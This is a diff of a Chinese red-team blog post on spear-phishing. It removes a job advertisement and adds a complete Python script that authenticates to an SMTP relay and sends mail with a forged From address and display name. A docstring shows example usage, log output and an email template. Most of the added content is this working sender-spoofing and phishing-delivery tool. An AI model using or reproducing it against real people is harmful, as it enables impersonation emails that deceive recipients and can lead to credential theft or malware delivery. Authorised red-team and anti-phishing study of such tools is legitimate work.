@@ -334,52 +334,175 @@ SESSION-ID：这里的SESSION-ID等于木马在本地生成的Windows GUID。
 
 ![2020-02-05-07-15-08](../../../static/images/8bd0f444-4f5f-11ec-ad16-00d861bf4abb.png)
 
-安恒红队已经实现了这些技术，构建鱼叉中的每一个环节来模拟鱼叉攻击进行红队行动。
+```python
+#!/usr/bin/python
+"""
+@Rvn0xsy - 鱼叉自动化脚本
+
+该脚本需要一个邮件服务器用来Relay，其次需要一个邮件正文eml文件用于发送，邮件服务器需要满足以下条件：
+
+1.支持转发
+2.SPF
+3.DKIM
+
+格式解释：
+'=?UTF-8?B?这里是BASE64编码?='
+
+B = Base64
+
+其中eml文件需要去除Header部分，脚本负责重构。
 
 
+Example >
 
-## 说了那么多，安恒红队招人！
+$ python .\smtp-relay.py -f <发送邮箱> -t <目标邮箱> -u <邮箱用户名> -p <邮箱密码> -r <伪造对象> --relay_name <伪造对象名称> --subject <邮件标题> -b <邮件正文文件>
+~\Desktop> python .\smtp-relay.py -f rvn0xsy@gmail.com -t rvn0xsy@gmail.com -u user -p XXX -r admin@gmail.com --relay_name 二维码科技 --subject 测试 -b .\send.eml
+2019-07-24 22:39:50,861 - .\smtp-relay.py[line:80] - INFO: 235 Authentication successful
+2019-07-24 22:39:53,979 - .\smtp-relay.py[line:52] - INFO: 250 Data Ok
+2019-07-24 22:39:53,983 - .\smtp-relay.py[line:87] - INFO: QUIT
 
+PS: DATA内容就是eml文件
 
+============<Header>============
+Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
+From: =?UTF-8?B?xxx?= xxx
+To: xxx
+Subject: =?UTF-8?B?xxx?=
+============</Header>============
 
-```
-安全招聘
-————————
-公司：安恒信息
-岗位：安全研究员
-部门：安服战略支援部
-薪资：13-30K
-工作年限：1年+
-工作地点：杭州（总部）、广州、成都、上海、北京
+============<DATA>============
 
-工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…
+X-Mailer: Server Version 1.0
+Content-Type: multipart/mixed; 
+	boundary="----=_Part_65_550351629.1563948317509"
+MIME-Version: 1.0
+Message-ID: <7a422a.12.16c22957b47.xxx>
+Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
 
-【岗位职责】
-1.定期面向部门、全公司技术分享;
-2.前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；
-3.负责完成部门渗透测试、红蓝对抗业务;
-4.负责自动化平台建设
-5.负责针对常见WAF产品规则进行测试并落地bypass方案
+------=_Part_65_550351629.1563948317509
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_67_1156720723.1563948317510"
 
-【岗位要求】
-1.至少1年安全领域工作经验；
-2.熟悉HTTP协议相关技术
-3.拥有大型产品、CMS、厂商漏洞挖掘案例；
-4.熟练掌握php、java、asp.net代码审计基础（一种或多种）
-5.精通Web Fuzz模糊测试漏洞挖掘技术
-6.精通OWASP TOP 10安全漏洞原理并熟悉漏洞利用方法
-7.有过独立分析漏洞的经验，熟悉各种Web调试技巧
-8.熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）
+------=_Part_67_1156720723.1563948317510
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: base64
 
-【加分项】
-1.具备良好的英语文档阅读能力；
-2.曾参加过技术沙龙担任嘉宾进行技术分享；
-3.具有CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP等安全相关资质者；
-4.具有大型SRC漏洞提交经验、获得年度表彰、大型CTF夺得名次者；
-5.开发过安全相关的开源项目；
-6.具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；
-7.个人技术博客；
-8.在优质社区投稿过文章；
+5L2g5Lus5aW95qOS77yB5Yqg5rK577yB
 
-简历投递至 strategy[at]dbappsecurity.com.cn
+------=_Part_67_1156720723.1563948317510
+
+============</DATA>============
+"""
+import telnetlib
+import time
+import logging
+import base64
+import argparse
+
+logging.basicConfig(format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s',level=logging.INFO)
+
+class SMTPClient():
+    def __init__(self,):
+        self.mail_from = ''
+        self.mail_to = []
+        self.send_data = ''
+        self.mail_header = ''
+        self.tn = telnetlib.Telnet()
+    def set_mail_header(self,mail_subject,mail_relay,mail_relay_name):
+        now_date = time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)", time.localtime())
+        self.mail_header = "Date: {}\r\nFrom: =?UTF-8?B?{}?= <{}>\r\nTo: {}\r\nSubject: =?UTF-8?B?{}?=\r\n".format(now_date,
+            base64.b64encode(mail_relay_name.encode()).decode(),
+            mail_relay,
+            self.mail_to[0],base64.b64encode(mail_subject.encode()).decode())
+        
+    def set_mail(self,mail_from,mail_to,send_body):
+        self.mail_from = mail_from
+        self.mail_to = mail_to
+        with open(send_body, "rb") as f_body:
+            self.send_data = f_body.read()
+        f_body.close()
+    def send_ehlo(self, content):
+        self.tn.write(content.encode())
+
+    def send_mail(self):
+        mail_from = "MAIL FROM:<%s>" % self.mail_from
+        logging.info(mail_from)
+        # 250 Mail Ok
+        self.tn.write(mail_from.encode() + b'\r\n')
+        self.tn.read_until(b"250 Mail Ok\r\n",timeout=3)
+        logging.info("250 Mail Ok")
+        
+        for mail in self.mail_to:
+            mail_rpct = "RCPT TO:<%s>" % mail
+            self.tn.write(mail_rpct.encode() + b'\r\n')
+            self.tn.read_until(b"250 Rcpt Ok\r\n",timeout=3)
+            logging.info(mail_rpct)
+        # 250 Rcpt Ok
+        self.tn.write(b'DATA\n')
+        self.tn.read_until(b"354 End data with <CR><LF>.<CR><LF>\r\n",timeout=3)
+        # 354 End data with <CR><LF>.<CR><LF>
+        send_all = self.mail_header.encode()+self.send_data+b"\r\n.\r\n"
+        # self.tn.write(self.mail_header.encode()+b"\r\n")
+        # self.tn.write(self.send_data+b"\r\n.\r\n")
+        self.tn.write(send_all)
+        # 250 Data Ok: queued as freedom
+        self.tn.read_until(b"250 Data Ok: queued as freedom\r\n",timeout=3)
+        logging.info("250 Data Ok")
+    def login_host(self,host_ip,username,password):
+        try:
+            self.tn.open(host_ip,port=25)
+        except:
+            logging.warning('%s Connect Error..'%host_ip)
+            return False
+        self.send_ehlo("EHLO virtual-machine\r\n")
+        # 250-smtp.aliyun-inc.com
+        # 250-STARTTLS
+        # 250-8BITMIME
+        # 250-AUTH=PLAIN LOGIN XALIOAUTH
+        # 250-AUTH PLAIN LOGIN XALIOAUTH
+        # 250-PIPELINING
+        # 250 DSN
+        self.tn.read_until(b"250-smtp.aliyun-inc.com\r\n",timeout=3)
+        self.tn.read_until(b"250-STARTTLS\r\n",timeout=3)
+        self.tn.read_until(b"250-8BITMIME\r\n",timeout=3)
+        self.tn.read_until(b"250-AUTH=PLAIN LOGIN XALIOAUTH\r\n",timeout=3)
+        self.tn.read_until(b"250-AUTH PLAIN LOGIN XALIOAUTH\r\n",timeout=3)
+        self.tn.read_until(b"250-PIPELINING\r\n",timeout=3)
+        self.tn.read_until(b"250 DSN\r\n",timeout=3)
+        self.tn.write(b"AUTH LOGIN\r\n")
+        self.tn.read_until(b"334 dXNlcm5hbWU6\r\n",timeout=3)
+        self.tn.write(base64.b64encode(username.encode()) + b'\r\n')
+        self.tn.read_until(b"334 UGFzc3dvcmQ6\r\n",timeout=3)
+        self.tn.write(base64.b64encode(password.encode()) + b'\r\n')
+        self.tn.read_until(b"235 Authentication successful\r\n",timeout=3)
+        logging.info("235 Authentication successful")
+        return True
+
+    def logout_host(self):
+        self.tn.write(b"QUIT\r\n")
+        self.tn.read_until(b"221 Bye\r\n",timeout=3)
+        self.tn.close()
+        logging.info("QUIT")
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.description = "AMAIL SMTP Relay Client - Version 1.0"
+    parser.add_argument("-f","--mail_from",type=str,help="Mail From",required = True)
+    parser.add_argument("-t","--mail_to",type=str,help="Mail To",required = True)
+    parser.add_argument("-u","--username",type=str,help="SMTP Username",required = True)
+    parser.add_argument("-p","--password",type=str,help="SMTP Password",required = True)
+    parser.add_argument("-s","--server",type=str,help="SMTP Server", default="smtp.mxhichina.com")
+    parser.add_argument("-b","--body",type=str,help="Mail Body", required = True)
+    parser.add_argument("-r","--relay",type=str,help="Mail Relay To", required = True)
+    parser.add_argument("--relay_name",type=str,help="Mail Relay To Name", required = True)
+    parser.add_argument("--subject",type=str,help="Mail Subject", required = True)
+    args = parser.parse_args()
+    
+    smtp_client = SMTPClient()
+
+    if smtp_client.login_host(args.server,args.username,args.password):
+        smtp_client.set_mail(args.mail_from,args.mail_to.split(","),args.body)
+        smtp_client.set_mail_header(args.subject,args.relay,args.relay_name)
+        smtp_client.send_mail()
+        smtp_client.logout_host()
 ```
